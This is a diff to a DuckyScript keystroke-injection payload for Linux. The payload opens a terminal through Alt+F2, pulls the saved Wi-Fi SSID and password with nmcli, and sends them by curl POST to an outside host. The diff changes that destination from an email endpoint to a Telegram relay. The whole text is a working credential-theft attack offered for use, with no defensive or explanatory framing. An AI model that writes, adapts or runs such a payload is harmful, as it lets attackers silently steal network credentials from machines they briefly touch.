@@ -1,6 +1,12 @@
 REM ctrl alt t has to be the shortcut for opening terminal, change it if it doesn't work for you
-CTRL ALT T
-DELAY 1000
+
+DELAY 5000
+
+ALT F2
+DELAY 1500
+STRING gnome-terminal
+ENTER
+DELAY 750
 
 STRING ssid=$(nmcli device wifi show-password | grep SSID | cut -d : -f 2 | xargs)
 ENTER
@@ -10,9 +16,12 @@ STRING if [ ! -z "$password" ]
 ENTER
 STRING then
 ENTER
-STRING curl -X POST -F "data=ssid:$ssid password:$password" http://<email-server>/email
+STRING msg="ssid=$ssid, password=$password"
+ENTER
+STRING curl --location --request POST 'https://<message-server>/telegram' --header 'Content-Type: application/json' --data-raw "{\"message\": \"$msg\"}"
 ENTER
 STRING fi
 ENTER
-STRING exit
+REM STRING exit
 ENTER
+
